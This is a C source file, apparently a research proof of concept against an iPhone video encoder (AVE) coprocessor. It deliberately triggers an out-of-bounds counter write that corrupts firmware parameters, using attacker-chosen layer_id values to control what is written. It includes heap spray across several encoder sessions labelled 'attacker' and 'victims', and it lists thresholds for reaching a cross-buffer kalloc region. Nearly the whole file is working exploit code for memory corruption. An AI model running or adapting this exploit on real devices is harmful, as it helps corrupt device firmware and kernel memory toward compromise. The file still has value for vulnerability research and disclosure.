/*
 * ave_firmware_param_probe.c — CVE-2026-114025 Firmware Parameter Corruption Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * Key finding (session 12): MOVZ scan revealed 65 field offsets in the
 * inter-sub-object gap (0x4770-0x7DDC) accessed via register-indirect patterns.
 * 16+ fields fall at byte position 4 of entry alignment, where layer_id
 * provides FULL 32-bit control (0-65535).
 *
 * These are firmware config parameters used by the AVE coprocessor during
 * encode. Corrupting them may cause the firmware to generate malformed
 * DMA commands or behave unexpectedly.
 *
 * Target parameters (at byte 4 = layer_id controlled):
 *   +0x5C34: entry #588, ~196 encodes
 *   +0x5D14: entry #602, ~200 encodes (3 refs, most used)
 *   +0x6414: entry #714, ~238 encodes (loaded into W24, used in encode path)
 *
 * This probe encodes specific frame counts to reach each target, with
 * specific layer_id values to control the corruption pattern.
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOKit
 *        -o AVEFirmwareParamProbe ave_firmware_param_probe.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avefwparam
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;
static volatile int g_cb_status = -999;
static volatile int g_cb_count = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = (int)status;
    g_cb_count++;
    g_encode_done = 1;
    if (status != 0) {
        printf("[CB#%d] ERROR status=%d flags=0x%x\n",
               g_cb_count, (int)status, (unsigned)flags);
        fflush(stdout);
    }
}

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);

    if (st != noErr || !session) {
        rlog("CREATE FAILED: %d\n", (int)st);
        return NULL;
    }

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    int base = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        rlog("PREPARE FAILED: %d\n", (int)st);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

static int encode_frames(VTCompressionSessionRef session, int n, int w, int h,
                         int verbose) {
    int errors = 0;
    for (int i = 0; i < n; i++) {
        CVPixelBufferRef pb = create_pb(w, h);
        if (!pb) { errors++; continue; }

        g_encode_done = 0;
        g_cb_status = -999;
        CMTime pts = CMTimeMake(i, 30);
        CMTime dur = CMTimeMake(1, 30);

        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        if (st != noErr) {
            if (verbose) rlog("[%d] EncodeFrame FAILED: %d\n", i, (int)st);
            CVPixelBufferRelease(pb);
            errors++;
            if (errors >= 5) break;
            continue;
        }

        for (int j = 0; j < 100 && !g_encode_done; j++) usleep(10000);

        if (g_cb_status != 0 && g_cb_status != -999) {
            if (verbose) rlog("[%d] callback error: %d\n", i, g_cb_status);
            errors++;
        }

        CVPixelBufferRelease(pb);

        if (verbose && ((i+1) % 25 == 0 || i == 0 || i == n-1))
            rlog("[frame %d/%d] %d errors\n", i+1, n, errors);
    }

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    usleep(500000);
    return errors;
}

static void measure_nal_sizes(void) {
    rlog("\n=== MEASURE: Determine NAL unit sizes and entries-per-encode ===\n");
    rlog("Encodes 5 frames at 128x128, dumps parameter set sizes\n\n");

    VTCompressionSessionRef session = create_mvhevc_encoder(128, 128, 1);
    if (!session) { rlog("FAILED\n"); return; }

    for (int i = 0; i < 5; i++) {
        CVPixelBufferRef pb = create_pb(128, 128);
        if (!pb) continue;

        g_encode_done = 0;
        CMTime pts = CMTimeMake(i, 30);
        CMTime dur = CMTimeMake(1, 30);

        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        if (st != noErr) {
            rlog("[%d] encode failed: %d\n", i, (int)st);
            CVPixelBufferRelease(pb);
            continue;
        }

        for (int j = 0; j < 100 && !g_encode_done; j++) usleep(10000);
        rlog("[%d] cb_status=%d\n", i, g_cb_status);
        CVPixelBufferRelease(pb);
    }

    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    usleep(500000);

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    rlog("Done. If status=0 above, MV-HEVC is supported on this device.\n");
    rlog("If status=-12912, MV-HEVC NOT supported (need iPhone 15 Pro+).\n");
}

static void reach_target(int target_encodes, int layer_id, const char *label) {
    rlog("\n=== TARGET: %s ===\n", label);
    rlog("Encoding %d frames with layer_id=%d (0x%x)\n", target_encodes, layer_id, layer_id);
    rlog("layer_id goes into bytes 4-7 of each OOB entry\n\n");

    VTCompressionSessionRef session = create_mvhevc_encoder(128, 128, layer_id);
    if (!session) { rlog("FAILED to create encoder\n"); return; }

    int errors = encode_frames(session, target_encodes, 128, 128, 1);

    if (errors > 0) {
        int est_entries = 0;
        for (int i = 0; i < target_encodes; i++) {
            if (i * 3 >= 256) break;
            est_entries++;
        }
        rlog("\nFIRST ERROR — %d errors total\n", errors);
        rlog("OOB likely started at ~86 encodes (258 entries)\n");
    } else {
        rlog("\nALL %d FRAMES SUCCEEDED\n", target_encodes);
        rlog("OOB entries written: ~%d (est.)\n", target_encodes * 3 - 256);
        rlog("Firmware parameter corruption occurred SILENTLY\n");
    }

    rlog("\nPost-corruption encode test...\n");
    g_encode_done = 0;
    g_cb_status = -999;
    CVPixelBufferRef pb = create_pb(128, 128);
    if (pb) {
        CMTime pts = CMTimeMake(target_encodes, 30);
        CMTime dur = CMTimeMake(1, 30);
        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
        for (int i = 0; i < 100 && !g_encode_done; i++) usleep(10000);
        rlog("Post-corruption: submit=%d, cb=%d\n", (int)st, g_cb_status);
        CVPixelBufferRelease(pb);
    }

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

static void spray_and_corrupt(int n_sessions, int target_encodes, int layer_id) {
    rlog("\n=== SPRAY+CORRUPT: %d sessions, %d encodes, lid=%d ===\n",
         n_sessions, target_encodes, layer_id);

    VTCompressionSessionRef sessions[32];
    int created = 0;

    for (int i = 0; i < n_sessions && i < 32; i++) {
        sessions[i] = create_mvhevc_encoder(128, 128, layer_id);
        if (sessions[i]) {
            created++;
            rlog("Session %d created\n", i);
        } else {
            rlog("Session %d FAILED\n", i);
            sessions[i] = NULL;
        }
    }
    rlog("Created %d/%d sessions\n\n", created, n_sessions);

    if (created < 2) {
        rlog("Need at least 2 sessions for spray\n");
        goto cleanup;
    }

    rlog("Encoding %d frames on session 0 (attacker)...\n", target_encodes);
    int errors = encode_frames(sessions[0], target_encodes, 128, 128, 1);
    rlog("Attacker encode: %d errors\n\n", errors);

    rlog("Testing all other sessions (victims) for corruption...\n");
    for (int i = 1; i < created; i++) {
        g_encode_done = 0;
        g_cb_status = -999;
        CVPixelBufferRef pb = create_pb(128, 128);
        if (!pb) continue;

        CMTime pts = CMTimeMake(0, 30);
        CMTime dur = CMTimeMake(1, 30);
        OSStatus st = VTCompressionSessionEncodeFrame(sessions[i], pb, pts, dur, NULL, NULL, NULL);
        for (int j = 0; j < 100 && !g_encode_done; j++) usleep(10000);

        rlog("Victim %d: submit=%d, cb=%d %s\n", i, (int)st, g_cb_status,
             (g_cb_status != 0 && g_cb_status != -999) ? "*** CORRUPTED ***" : "ok");
        CVPixelBufferRelease(pb);
    }

cleanup:
    for (int i = 0; i < created; i++) {
        if (sessions[i]) {
            VTCompressionSessionInvalidate(sessions[i]);
            CFRelease(sessions[i]);
        }
    }
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_fw_param.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 Firmware Parameter Corruption Probe ===\n");
    rlog("Target: corrupt HEVC config parameters via counter OOB\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "help";

    if (strcmp(mode, "measure") == 0) {
        measure_nal_sizes();

    } else if (strcmp(mode, "param_array") == 0) {
        rlog("Target: firmware param array at +0x5C34 to +0x5F94\n");
        rlog("Entry #588 (~196 encodes) through #642 (~214 encodes)\n");
        rlog("layer_id=0x4141 → writes 0x00004141 at byte 4 of each entry\n\n");
        reach_target(220, 0x4141, "+0x5C34-0x5F94 param array (lid=0x4141)");

    } else if (strcmp(mode, "w24_target") == 0) {
        rlog("Target: W24 load at +0x6414\n");
        rlog("Entry #714 (~238 encodes)\n");
        rlog("layer_id=0xBEEF → W24 reads 0x0000BEEF from corrupted field\n\n");
        reach_target(250, 0xBEEF, "+0x6414 W24 target (lid=0xBEEF)");

    } else if (strcmp(mode, "safe") == 0) {
        rlog("SAFE: 50 encodes (within bounds, no OOB)\n\n");
        reach_target(50, 1, "safe baseline (50 encodes, lid=1)");

    } else if (strcmp(mode, "boundary") == 0) {
        rlog("BOUNDARY: 100 encodes (crosses 256-entry limit)\n\n");
        reach_target(100, 1, "boundary test (100 encodes, lid=1)");

    } else if (strcmp(mode, "spray4") == 0) {
        rlog("SPRAY: 4 sessions, 300 encodes, lid=0x4141\n\n");
        spray_and_corrupt(4, 300, 0x4141);

    } else if (strcmp(mode, "spray8") == 0) {
        rlog("SPRAY: 8 sessions, 400 encodes, lid=0xDEAD\n\n");
        spray_and_corrupt(8, 400, 0xDEAD);

    } else {
        rlog("Usage: AVEFirmwareParamProbe <mode>\n");
        rlog("  measure      -- check MV-HEVC support, measure NAL sizes\n");
        rlog("  safe         -- 50 encodes (within bounds, baseline)\n");
        rlog("  boundary     -- 100 encodes (crosses 256-entry boundary)\n");
        rlog("  param_array  -- 220 encodes (targets +0x5C34-0x5F94, lid=0x4141)\n");
        rlog("  w24_target   -- 250 encodes (targets +0x6414 W24, lid=0xBEEF)\n");
        rlog("  spray4       -- 4-session spray + 300 encodes + victim test\n");
        rlog("  spray8       -- 8-session spray + 400 encodes + victim test\n");
        rlog("\nKey thresholds:\n");
        rlog("  86 encodes:  258 entries, first sub-object OOB\n");
        rlog("  196 encodes: entry #588, first controllable param (+0x5C34)\n");
        rlog("  238 encodes: entry #714, W24 target (+0x6414)\n");
        rlog("  353 encodes: entry #1058, cross-buffer (kalloc.49152)\n");
    }

    rlog("\n=== Probe complete ===\n");
    if (g_log) fclose(g_log);
    return 0;
}
